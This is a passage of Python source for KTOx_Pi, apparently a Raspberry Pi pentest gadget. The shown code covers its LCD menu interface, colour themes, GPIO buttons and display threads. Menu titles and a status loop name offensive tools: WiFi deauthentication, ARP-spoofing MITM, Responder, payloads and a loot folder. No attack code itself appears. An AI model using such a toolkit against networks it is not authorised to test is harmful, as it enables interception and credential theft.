#!/usr/bin/env python3
# ktox_device.py — KTOx_Pi v1.0
# Raspberry Pi Zero 2W · Kali ARM64 · Waveshare 1.44" LCD HAT (ST7735S)
#
# Architecture: mirrors KTOx exactly
#   · Global image / draw / LCD objects
#   · _display_loop  — LCD_ShowImage() at ~10 fps continuously
#   · _stats_loop    — toolbar (temp + status) every 2 s
#   · draw_lock      — threading.Lock  on every draw call
#   · screen_lock    — threading.Event frozen during payload
#   · getButton()    — virtual (WebUI Unix socket) first, then GPIO
#   · exec_payload() — subprocess.run() BLOCKING + _setup_gpio() restore
#
# WebUI: device_server.py (WebSocket :8765) + web_server.py (HTTP :8080)
# Loot:  /root/KTOx/loot/  (symlinked from /root/KTOx/loot)
#
# Menu navigation
#   Joystick UP/DOWN     navigate
#   Joystick CTR/RIGHT   select / enter
#   KEY1  / LEFT         back
#   KEY2                 home
#   KEY3                 stop attack / exit payload

import os, sys, time, json, threading, subprocess, signal, socket, ipaddress, math
import base64, hashlib, hmac, secrets
from datetime import datetime
from functools import partial
from pathlib import Path

# ── Paths ─────────────────────────────────────────────────────────────────────

KTOX_DIR      = "/root/KTOx"
INSTALL_PATH  = KTOX_DIR + "/"
LOOT_DIR      = KTOX_DIR + "/loot"
PAYLOAD_DIR   = KTOX_DIR + "/payloads"
WALLPAPER_DIR = LOOT_DIR + "/wallpapers"
PAYLOAD_LOG   = LOOT_DIR + "/payload.log"
VERSION      = "1.7"

sys.path.insert(0, KTOX_DIR)
sys.path.insert(0, KTOX_DIR + "/ktox_pi")

# ── WebUI input bridge (independent of physical hardware) ──────────────────────

try:
    import ktox_input as rj_input
    HAS_INPUT = True
except Exception as _ie:
    print(f"[WARN] WebUI input bridge unavailable ({_ie})")
    HAS_INPUT = False

# ── USB/Bluetooth keyboard input handler ──────────────────────────────────────

try:
    import keyboard_input
    HAS_KEYBOARD = keyboard_input.HAS_EVDEV
except Exception as _ke:
    HAS_KEYBOARD = False

# ── Hardware imports ───────────────────────────────────────────────────────────

try:
    import RPi.GPIO as GPIO
    from PIL import Image, ImageDraw, ImageFont
    import LCD_1in44
    import LCD_Config
    HAS_HW = True
except Exception as _ie:
    print(f"[WARN] Hardware unavailable ({_ie}) — headless mode")
    HAS_HW = False

# ── GPIO pin map ───────────────────────────────────────────────────────────────

PINS = {
    "KEY_UP_PIN":    6,
    "KEY_DOWN_PIN":  19,
    "KEY_LEFT_PIN":  5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN":      21,
    "KEY2_PIN":      20,
    "KEY3_PIN":      16,
}

# ── Threading primitives ───────────────────────────────────────────────────────

draw_lock   = threading.Lock()      # protect every draw call
screen_lock = threading.Event()     # set = freeze display / stats threads
_stop_evt   = threading.Event()

# ── Button debounce state ──────────────────────────────────────────────────────

_last_button       = None
_last_button_time  = 0.0
_button_down_since = 0.0
_debounce_s        = 0.10
_repeat_delay      = 0.25
_repeat_interval   = 0.08

# ── Manual-lock: hold KEY3 for this many seconds to lock from anywhere ─────────
_LOCK_HOLD_BTN  = "KEY3_PIN"
_LOCK_HOLD_SECS = 2.0

# ── Live status text (updated by _stats_loop) ─────────────────────────────────

_status_text = ""
_temp_c      = 0.0

# ── Payload state paths ────────────────────────────────────────────────────────

PAYLOAD_STATE_PATH   = "/dev/shm/ktox_payload_state.json"
PAYLOAD_REQUEST_PATH = "/dev/shm/rj_payload_request.json"   # WebUI uses rj_ prefix

# ── Global LCD / image / draw (KTOx pattern — must be globals) ───────────

LCD   = None
image = None
draw  = None

# ── Fonts ──────────────────────────────────────────────────────────────────────

text_font  = None
small_font = None
icon_font  = None
medium_icon_font = None
large_icon_font = None
xlarge_icon_font = None

def _load_fonts():
    global text_font, small_font, icon_font, medium_icon_font, large_icon_font, xlarge_icon_font
    MONO_BOLD = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"
    MONO      = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
    FA        = "/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf"
    def _f(p, sz):
        try:    return ImageFont.truetype(p, sz)
        except: return ImageFont.load_default()
    text_font  = _f(MONO_BOLD, 9)
    small_font = _f(MONO,      8)
    icon_font  = _f(FA,       12) if os.path.exists(FA) else None
    medium_icon_font = _f(FA,  20) if os.path.exists(FA) else None
    large_icon_font = _f(FA,   32) if os.path.exists(FA) else None
    xlarge_icon_font = _f(FA,  56) if os.path.exists(FA) else None

# ── Runtime state ──────────────────────────────────────────────────────────────

ktox_state = {
    "iface":       "eth0",
    "wifi_iface":  "wlan0",   # updated by _init_wifi_iface() after GPIO setup
    "gateway":     "",
    "hosts":       [],
    "running":     None,
    "mon_iface":   None,
    "stealth":     False,
    "stealth_image": None,
}

def _init_wifi_iface():
    """Called once after hardware init. Prefer wlan1 (external adapter) over wlan0."""
    import re as _re
    try:
        rc, out = _run(["iw", "dev"])
        ifaces = _re.findall(r"Interface\s+(\w+)", out) if rc == 0 else []
    except Exception:
        ifaces = []
    for candidate in ("wlan1", "wlan2", "wlan3"):
        if candidate in ifaces:
            ktox_state["wifi_iface"] = candidate
            return
    # Keep wlan0 if it's the only one available

# ═══════════════════════════════════════════════════════════════════════════════
# ── Defaults / config class ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class Defaults:
    start_text      = [10, 20]
    text_gap        = 14
    install_path    = INSTALL_PATH
    payload_path    = PAYLOAD_DIR + "/"
    payload_log     = PAYLOAD_LOG
    imgstart_path   = "/root/"
    config_file     = KTOX_DIR + "/gui_conf.json"
    screensaver_gif = KTOX_DIR + "/img/screensaver/default.gif"

default = Defaults()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Colour scheme ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class ColorScheme:
    border            = "#8B0000"
    background        = "#0a0a0a"
    text              = "#c8c8c8"
    selected_text     = "#FFFFFF"
    select            = "#640000"
    gamepad           = "#640000"
    gamepad_fill      = "#F0EDE8"
    title_bg          = "#1a0000"
    panel_bg          = "#0d0606"
    topbar_bg         = "#0d0000"
    topbar_text       = "#5a2020"
    topbar_accent     = "#3a0000"
    current_theme     = "ktox_red"

    def DrawBorder(self):
        draw.line([(127,12),(127,127)], fill=self.border, width=5)
        draw.line([(127,127),(0,127)],  fill=self.border, width=5)
        draw.line([(0,127),(0,12)],     fill=self.border, width=5)
        draw.line([(0,12),(128,12)],    fill=self.border, width=5)

    def DrawMenuBackground(self):
        if _wallpaper_image:
            _draw_wallpaper_background()
        draw.rectangle((3, 14, 124, 124), fill=self.background)

    def apply_theme(self, name, persist=True):
        preset = UI_THEMES.get(name)
        if not preset:
            return False
        self.current_theme = name
        self.border        = preset["BORDER"]
        self.background    = preset["BACKGROUND"]
        self.text          = preset["TEXT"]
        self.selected_text = preset["SELECTED_TEXT"]
        self.select        = preset["SELECTED_TEXT_BACKGROUND"]
        self.gamepad       = preset["GAMEPAD"]
        self.gamepad_fill  = preset["GAMEPAD_FILL"]
        self.title_bg      = preset.get("TITLE_BG", self.title_bg)
        self.panel_bg      = preset.get("PANEL_BG", self.panel_bg)
        self.topbar_bg     = preset.get("TOPBAR_BG", self.topbar_bg)
        self.topbar_text   = preset.get("TOPBAR_TEXT", self.topbar_text)
        self.topbar_accent = preset.get("TOPBAR_ACCENT", self.topbar_accent)
        _apply_ux_from_theme(preset)
        if persist:
            _save_ui_theme(name)
        return True

    def load_from_file(self):
        global _view_mode
        try:
            data = json.loads(Path(default.config_file).read_text())
            requested = str(data.get("UI", {}).get("THEME", "")).strip()

            if requested == "custom":
                # Load custom colors
                c = data.get("COLORS", {})
                self.border        = c.get("BORDER",            self.border)
                self.background    = c.get("BACKGROUND",         self.background)
                self.text          = c.get("TEXT",               self.text)
                self.selected_text = c.get("SELECTED_TEXT",      self.selected_text)
                self.select        = c.get("SELECTED_TEXT_BACKGROUND", self.select)
                self.gamepad       = c.get("GAMEPAD",            self.gamepad)
                self.gamepad_fill  = c.get("GAMEPAD_FILL",       self.gamepad_fill)
                self.title_bg      = c.get("TITLE_BG",           self.title_bg)
                self.panel_bg      = c.get("PANEL_BG",           self.panel_bg)
                self.topbar_bg     = c.get("TOPBAR_BG",          self.topbar_bg)
                self.topbar_text   = c.get("TOPBAR_TEXT",        self.topbar_text)
                self.topbar_accent = c.get("TOPBAR_ACCENT",      self.topbar_accent)
                self.current_theme = "custom"
            elif requested in UI_THEMES:
                # Load preset theme
                self.apply_theme(requested, persist=False)
                # But also load any color overrides from COLORS section if present
                c = data.get("COLORS", {})
                if c:  # Only override if COLORS section exists
                    self.border        = c.get("BORDER",            self.border)
                    self.background    = c.get("BACKGROUND",         self.background)
                    self.text          = c.get("TEXT",               self.text)
                    self.selected_text = c.get("SELECTED_TEXT",      self.selected_text)
                    self.select        = c.get("SELECTED_TEXT_BACKGROUND", self.select)
                    self.gamepad       = c.get("GAMEPAD",            self.gamepad)
                    self.gamepad_fill  = c.get("GAMEPAD_FILL",       self.gamepad_fill)
                    self.title_bg      = c.get("TITLE_BG",           self.title_bg)
                    self.panel_bg      = c.get("PANEL_BG",           self.panel_bg)
                    self.topbar_bg     = c.get("TOPBAR_BG",          self.topbar_bg)
                    self.topbar_text   = c.get("TOPBAR_TEXT",        self.topbar_text)
                    self.topbar_accent = c.get("TOPBAR_ACCENT",      self.topbar_accent)
            else:
                # Fallback to ktox_red
                self.apply_theme("ktox_red", persist=False)

            # Load view mode preference
            view_mode = str(data.get("UI", {}).get("VIEW_MODE", "list")).strip()
            if view_mode in ("list", "grid", "carousel", "panel", "table", "paged", "thumbnail", "vcarousel"):
                _view_mode = view_mode

            # Load wallpaper preference
            wallpaper = data.get("UI", {}).get("WALLPAPER", "")
            if wallpaper:
                _load_wallpaper(wallpaper)

            # Load lock config and screensaver path
            _lock_load_from_config(data)
            p = data.get("PATHS", {}).get("SCREENSAVER_GIF", "")
            if p:
                default.screensaver_gif = p
        except Exception:
            pass


UI_THEMES = {
    "ktox_red": {
        "label": "Operator Classic",
        "BORDER": "#8B0000", "BACKGROUND": "#0a0a0a", "TEXT": "#c8c8c8",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#640000",
        "GAMEPAD": "#640000", "GAMEPAD_FILL": "#F0EDE8",
        "TITLE_BG": "#1a0000", "PANEL_BG": "#0d0606",
        "TOPBAR_BG": "#0d0000", "TOPBAR_TEXT": "#5a2020", "TOPBAR_ACCENT": "#3a0000",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "obsidian_cyan": {
        "label": "Panel Ops",
        "BORDER": "#00B7C2", "BACKGROUND": "#071015", "TEXT": "#BEEAF0",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#005B66",
        "GAMEPAD": "#005B66", "GAMEPAD_FILL": "#DDF9FC",
        "TITLE_BG": "#09242A", "PANEL_BG": "#0B1A20",
        "TOPBAR_BG": "#051113", "TOPBAR_TEXT": "#006B7A", "TOPBAR_ACCENT": "#00495A",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 15, "UX_START_Y": 27,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "outline",
    },
    "midnight_violet": {
        "label": "Compact Stealth",
        "BORDER": "#8A4DFF", "BACKGROUND": "#0B0815", "TEXT": "#D7CBFF",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#4A2B86",
        "GAMEPAD": "#4A2B86", "GAMEPAD_FILL": "#EFE8FF",
        "TITLE_BG": "#1A1030", "PANEL_BG": "#151028",
        "TOPBAR_BG": "#0A050F", "TOPBAR_TEXT": "#5A3D99", "TOPBAR_ACCENT": "#3A1F66",
        "UX_WINDOW_ROWS": 8, "UX_ROW_H": 11, "UX_START_Y": 25,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "terminal_green": {
        "label": "Terminal Focus",
        "BORDER": "#2AAE51", "BACKGROUND": "#060C08", "TEXT": "#A8E0B8",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#1C6D33",
        "GAMEPAD": "#1C6D33", "GAMEPAD_FILL": "#E3F7E9",
        "TITLE_BG": "#0E1F14", "PANEL_BG": "#0B1710",
        "TOPBAR_BG": "#050A07", "TOPBAR_TEXT": "#1C5D2F", "TOPBAR_ACCENT": "#0D3D1F",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 14, "UX_START_Y": 28,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "neon_magenta": {
        "label": "Magenta Ops",
        "BORDER": "#FF2BD6", "BACKGROUND": "#09040F", "TEXT": "#FFD6F8",
        "SELECTED_TEXT": "#0B0210", "SELECTED_TEXT_BACKGROUND": "#FF2BD6",
        "GAMEPAD": "#B00088", "GAMEPAD_FILL": "#FFD6F8",
        "TITLE_BG": "#2A0A33", "PANEL_BG": "#14071C",
        "TOPBAR_BG": "#08030D", "TOPBAR_TEXT": "#881B66", "TOPBAR_ACCENT": "#550088",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 15, "UX_START_Y": 27,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "cyberpunk_amber": {
        "label": "Amber Field",
        "BORDER": "#FF9F1A", "BACKGROUND": "#0E0703", "TEXT": "#FFD9AA",
        "SELECTED_TEXT": "#1A0A03", "SELECTED_TEXT_BACKGROUND": "#FF9F1A",
        "GAMEPAD": "#9C4E00", "GAMEPAD_FILL": "#FFE4C4",
        "TITLE_BG": "#331A08", "PANEL_BG": "#1B1007",
        "TOPBAR_BG": "#0D0602", "TOPBAR_TEXT": "#7A3D00", "TOPBAR_ACCENT": "#552200",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "darksec_experimental": {
        "label": "DarkSec Grid",
        "BORDER": "#00E5FF", "BACKGROUND": "#070B14", "TEXT": "#CCF4FF",
        "SELECTED_TEXT": "#041018", "SELECTED_TEXT_BACKGROUND": "#00A0CC",
        "GAMEPAD": "#006B88", "GAMEPAD_FILL": "#D9F8FF",
        "TITLE_BG": "#0B2033", "PANEL_BG": "#0B1422",
        "TOPBAR_BG": "#051219", "TOPBAR_TEXT": "#005A88", "TOPBAR_ACCENT": "#003D66",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 15, "UX_START_Y": 27,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "pulse",
        "UX_CYBER_BARS": True,
    },
    "obsidian_red": {
        "label": "Red Team",
        "BORDER": "#CC0000", "BACKGROUND": "#0a0a0a", "TEXT": "#d4a574",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#801414",
        "GAMEPAD": "#8B0000", "GAMEPAD_FILL": "#F5E6D3",
        "TITLE_BG": "#220000", "PANEL_BG": "#1a0a0a",
        "TOPBAR_BG": "#0C0000", "TOPBAR_TEXT": "#663333", "TOPBAR_ACCENT": "#440000",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "outline",
    },
    "slate_blue": {
        "label": "Slate Console",
        "BORDER": "#4A5BB7", "BACKGROUND": "#0d0e15", "TEXT": "#c9d1e0",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#2e3a7a",
        "GAMEPAD": "#1f2954", "GAMEPAD_FILL": "#e8edf8",
        "TITLE_BG": "#15172a", "PANEL_BG": "#0f1320",
        "TOPBAR_BG": "#0A0B11", "TOPBAR_TEXT": "#2A3055", "TOPBAR_ACCENT": "#151B3D",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "forest_green": {
        "label": "Green Ops",
        "BORDER": "#3BA655", "BACKGROUND": "#080f09", "TEXT": "#b8d4ba",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#2d5c3a",
        "GAMEPAD": "#1a4028", "GAMEPAD_FILL": "#dce8dd",
        "TITLE_BG": "#0f2416", "PANEL_BG": "#0c1a0e",
        "TOPBAR_BG": "#070D08", "TOPBAR_TEXT": "#1F4D2F", "TOPBAR_ACCENT": "#0F2A1F",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 14, "UX_START_Y": 28,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "sunburst_orange": {
        "label": "Amber Signal",
        "BORDER": "#FF8C00", "BACKGROUND": "#0f0804", "TEXT": "#ffc89a",
        "SELECTED_TEXT": "#1a0a03", "SELECTED_TEXT_BACKGROUND": "#FF8C00",
        "GAMEPAD": "#cc5500", "GAMEPAD_FILL": "#ffe4d6",
        "TITLE_BG": "#3d2207", "PANEL_BG": "#1f1207",
        "TOPBAR_BG": "#0E0703", "TOPBAR_TEXT": "#665522", "TOPBAR_ACCENT": "#443300",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "plasma_purple": {
        "label": "Violet Grid",
        "BORDER": "#B833FF", "BACKGROUND": "#0a0515", "TEXT": "#dfc8ff",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#6b2d8f",
        "GAMEPAD": "#4a1a66", "GAMEPAD_FILL": "#e8d4ff",
        "TITLE_BG": "#1a0a2a", "PANEL_BG": "#0d0518",
        "TOPBAR_BG": "#090413", "TOPBAR_TEXT": "#5A2D7A", "TOPBAR_ACCENT": "#351A55",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 15, "UX_START_Y": 27,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "ice_blue": {
        "label": "Arctic Blue",
        "BORDER": "#00D4FF", "BACKGROUND": "#050a12", "TEXT": "#b3e5ff",
        "SELECTED_TEXT": "#041c2e", "SELECTED_TEXT_BACKGROUND": "#00A8CC",
        "GAMEPAD": "#004466", "GAMEPAD_FILL": "#d9f7ff",
        "TITLE_BG": "#0a1820", "PANEL_BG": "#08141f",
        "TOPBAR_BG": "#040810", "TOPBAR_TEXT": "#005080", "TOPBAR_ACCENT": "#003355",
        "UX_WINDOW_ROWS": 8, "UX_ROW_H": 11, "UX_START_Y": 25,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "outline",
    },
    "midnight_noir": {
        "label": "Midnight Noir",
        "BORDER": "#505050", "BACKGROUND": "#050505", "TEXT": "#e0e0e0",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#2a2a2a",
        "GAMEPAD": "#1a1a1a", "GAMEPAD_FILL": "#f5f5f5",
        "TITLE_BG": "#0a0a0a", "PANEL_BG": "#0f0f0f",
        "TOPBAR_BG": "#040404", "TOPBAR_TEXT": "#2A2A2A", "TOPBAR_ACCENT": "#161616",
        "UX_WINDOW_ROWS": 7, "UX_ROW_H": 13, "UX_START_Y": 26,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
    "neon_cyan": {
        "label": "Cyan Trace",
        "BORDER": "#00FFFF", "BACKGROUND": "#080808", "TEXT": "#00FFFF",
        "SELECTED_TEXT": "#000000", "SELECTED_TEXT_BACKGROUND": "#00FFFF",
        "GAMEPAD": "#008080", "GAMEPAD_FILL": "#E0FFFF",
        "TITLE_BG": "#0a1818", "PANEL_BG": "#0a0f0f",
        "TOPBAR_BG": "#070707", "TOPBAR_TEXT": "#006666", "TOPBAR_ACCENT": "#004040",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 15, "UX_START_Y": 27,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "scanline",
    },
    "synthetic_rose": {
        "label": "Rose Console",
        "BORDER": "#FF1493", "BACKGROUND": "#0f080d", "TEXT": "#ffb3d9",
        "SELECTED_TEXT": "#FFFFFF", "SELECTED_TEXT_BACKGROUND": "#991166",
        "GAMEPAD": "#660044", "GAMEPAD_FILL": "#ffe0f0",
        "TITLE_BG": "#330033", "PANEL_BG": "#1a0d1a",
        "TOPBAR_BG": "#0E080C", "TOPBAR_TEXT": "#664455", "TOPBAR_ACCENT": "#442233",
        "UX_WINDOW_ROWS": 6, "UX_ROW_H": 14, "UX_START_Y": 28,
        "UX_SHOW_ICONS": True, "UX_SELECT_STYLE": "fill",
    },
}

_ui_ux = {
    "window_rows": 7,
    "row_h": 13,
    "start_y": 26,
    "show_icons": True,
    "select_style": "fill",
    "cyber_bars": False,
}

_view_mode = "list"  # list, grid, or carousel
_wallpaper_path = None  # current wallpaper image path
_wallpaper_image = None  # cached PIL Image object

def _load_wallpaper(path: str):
    """Load and cache wallpaper image, resize to 128x128."""
    global _wallpaper_image, _wallpaper_path
    if not path or not os.path.isfile(path):
        _wallpaper_image = None
        _wallpaper_path = None
        return False
    try:
        img = Image.open(path)
        img = img.resize((128, 128), Image.Resampling.LANCZOS)
        _wallpaper_image = img
        _wallpaper_path = path
        return True
    except Exception as e:
        print(f"[UI] Failed to load wallpaper: {e}")
        _wallpaper_image = None
        _wallpaper_path = None
        return False

def _draw_wallpaper_background():
    """Draw wallpaper as background if loaded."""
    if _wallpaper_image:
        try:
            image.paste(_wallpaper_image, (0, 0))
        except Exception:
            pass

def _apply_ux_from_theme(preset: dict):
    _ui_ux["window_rows"] = int(preset.get("UX_WINDOW_ROWS", 7))
    _ui_ux["row_h"] = int(preset.get("UX_ROW_H", 13))
    _ui_ux["start_y"] = int(preset.get("UX_START_Y", 26))
    _ui_ux["show_icons"] = bool(preset.get("UX_SHOW_ICONS", True))
    _ui_ux["select_style"] = str(preset.get("UX_SELECT_STYLE", "fill"))
    _ui_ux["cyber_bars"] = bool(preset.get("UX_CYBER_BARS", False))

def _ux_window_rows():
    return max(5, min(8, int(_ui_ux.get("window_rows", 8))))


def _menu_metrics(start_y=None, row_h=None, rows=None):
    start_y = int(_ui_ux.get("start_y", 26) if start_y is None else start_y)
    row_h = int(_ui_ux.get("row_h", 13) if row_h is None else row_h)
    start_y = max(25, min(32, start_y))
    row_h = max(11, min(14, row_h))
    max_rows = max(1, (124 - start_y) // row_h)
    rows = _ux_window_rows() if rows is None else int(rows)
    return start_y, row_h, max(1, min(rows, max_rows))


def _menu_title(key_or_title):
    titles = {
        "home": "KTOx_Pi",
        "net": "Network",
        "off": "Offensive",
        "wifi": "WiFi Engine",
        "mitm": "MITM & Spoof",
        "resp": "Responder",
        "purple": "Purple Team",
        "pay": "Payloads",
        "loot": "Loot",
        "sys": "System",
    }
    return titles.get(str(key_or_title or ""), str(key_or_title or "Menu"))


def _draw_menu_title(title):
    title = _menu_title(title)
    icon = _icon_for(title)
    text = (icon + " " if icon else "") + title
    draw.rectangle([3, 13, 125, 24], fill=color.title_bg)
    _centered(_truncate(text, 112, font=small_font), 14, font=small_font, fill=color.border)
    draw.line([(3, 24), (125, 24)], fill=color.border, width=1)


def _draw_scroll_pip(total, offset, rows, start_y, row_h):
    if total <= rows:
        return
    span = max(1, row_h * rows)
    pip_h = max(6, int(rows / total * span))
    pip_y = start_y + int(offset / max(1, total - rows) * max(1, span - pip_h))
    draw.rectangle([125, pip_y, 127, min(124, pip_y + pip_h)], fill=color.border)


def _save_ui_theme(theme_name: str):
    try:
        path = default.config_file
        try:
            data = json.loads(Path(path).read_text())
        except Exception:
            data = {}
        preset = UI_THEMES.get(theme_name, UI_THEMES["ktox_red"])
        data.setdefault("UI", {})["THEME"] = theme_name
        data["COLORS"] = {
            "BORDER": preset["BORDER"],
            "BACKGROUND": preset["BACKGROUND"],
            "TEXT": preset["TEXT"],
            "SELECTED_TEXT": preset["SELECTED_TEXT"],
            "SELECTED_TEXT_BACKGROUND": preset["SELECTED_TEXT_BACKGROUND"],
            "GAMEPAD": preset["GAMEPAD"],
            "GAMEPAD_FILL": preset["GAMEPAD_FILL"],
            "TITLE_BG": preset["TITLE_BG"],
            "PANEL_BG": preset["PANEL_BG"],
        }
        Path(path).write_text(json.dumps(data, indent=2))
    except Exception as e:
        print(f"[UI] save theme failed: {e}")

color = ColorScheme()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Hardware init / restore ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _setup_gpio():
    """
    (Re-)initialise GPIO + LCD.  Called once at boot and after every
    exec_payload() because payloads call GPIO.cleanup() on exit which
    kills the SPI bus.
    """
    global LCD, image, draw
    if not HAS_HW:
        if image is None:
            image = Image.new("RGB", (128, 128), "#0a0a0a")
            draw  = ImageDraw.Draw(image)
        return

    GPIO.setmode(GPIO.BCM)
    GPIO.setwarnings(False)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD   = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD_Config.Driver_Delay_ms(50)   # 50ms settle after GPIO init
    image = Image.new("RGB", (LCD.width, LCD.height), "#0a0a0a")
    draw  = ImageDraw.Draw(image)


def _init_wallpapers():
    """Create wallpaper directory and copy starter assets."""
    try:
        wp_dir = Path(WALLPAPER_DIR)
        wp_dir.mkdir(parents=True, exist_ok=True)

        # Copy logo.bmp from assets if it exists and isn't already there
        asset_logo = Path("/assets/logo.bmp")
        wallpaper_logo = wp_dir / "ktox_logo.bmp"
        if asset_logo.exists() and not wallpaper_logo.exists():
            import shutil
            shutil.copy2(asset_logo, wallpaper_logo)
    except Exception as e:
        print(f"[UI] wallpaper init failed: {e}")

def _hw_init():
    """Full boot initialisation."""
    _setup_gpio()
    _load_fonts()
    _init_wifi_iface()   # auto-select wlan1 if present
    _init_wallpapers()   # setup wallpaper directory and assets
    color.load_from_file()
    # Show KTOx logo BMP if available
    logo = Path(INSTALL_PATH + "img/logo.bmp")
    if HAS_HW and logo.exists():
        try:
            img = Image.open(logo)
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(0.8)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# ── Background threads ─────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _temp() -> float:
    try:
        with open("/sys/class/thermal/thermal_zone0/temp") as f:
            return int(f.read()) / 1000
    except Exception:
        return 0.0


def _draw_toolbar():
    """Draw temp + status bar at y=0..11.  Caller holds draw_lock."""
    try:
        draw.rectangle([(0,0),(128,11)], fill=color.topbar_bg)
        # Temp left side
        draw.text((1,1), f"{_temp_c:.0f}C", font=small_font, fill=color.topbar_text)
        # Version tag right side
        draw.text((100,1), f"v{VERSION}", font=small_font, fill=color.topbar_accent)
        # Status or brand centre
        if _status_text:
            draw.text((22,1), _status_text[:14], font=small_font, fill=color.border)
        else:
            draw.text((34,1), "KTOx_Pi", font=small_font, fill=color.topbar_text)
        draw.line([(0,11),(128,11)], fill=color.border, width=1)
    except Exception:
        pass


def _stats_loop():
    global _status_text, _temp_c
    while not _stop_evt.is_set():
        if screen_lock.is_set():
            time.sleep(0.5)
            continue
        try:
            _temp_c = _temp()
            s = ""
            if ktox_state.get("running"):
                s = f"[{ktox_state['running'][:14]}]"
            elif subprocess.call(["pgrep","airodump-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(WiFi scan)"
            elif subprocess.call(["pgrep","aireplay-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(deauth)"
            elif subprocess.call(["pgrep","arpspoof"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(MITM)"
            elif subprocess.call(["pgrep","Responder"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(Responder)"
            _status_text = s
            with draw_lock:
                _draw_toolbar()
        except Exception:
            pass
        time.sleep(2)


def _display_loop():
    _FRAME_PATH     = os.environ.get("RJ_FRAME_PATH", "/dev/shm/ktox_last.jpg")
    _FRAME_ENABLED  = os.environ.get("RJ_FRAME_MIRROR", "1") != "0"
    _FRAME_INTERVAL = 1.0 / max(1.0, float(os.environ.get("RJ_FRAME_FPS", "10")))
    last_save = 0.0

    while not _stop_evt.is_set():
        if not screen_lock.is_set() and HAS_HW and LCD and image:
            mirror = None
            with draw_lock:
                try:
                    LCD.LCD_ShowImage(image, 0, 0)
                except Exception:
                    pass
                if _FRAME_ENABLED:
                    now = time.monotonic()
                    if now - last_save >= _FRAME_INTERVAL:
                        try:    mirror = image.copy()
                        except: pass
                        last_save = now
            if mirror:
                try:    mirror.save(_FRAME_PATH, "JPEG", quality=80)
                except: pass
        time.sleep(0.2)


def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Button input ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def getButton(timeout=120):
    """
    Block until a button press and return its pin name string.
    Checks WebUI virtual buttons (Unix socket via rj_input) first.
    timeout: max seconds to wait (default 120 — prevents infinite freeze).
    Returns None on timeout.
    """
    global _last_button, _last_button_time, _button_down_since
    start = time.time()

    while True:
        # Hard timeout — prevents infinite freeze
        if (time.time() - start) > timeout:
            _last_button = None
            return None

        # Auto-lock check
        if _should_auto_lock():
            lock_device("Auto lock")
            start = time.time()  # Reset timeout after returning from lock
            continue

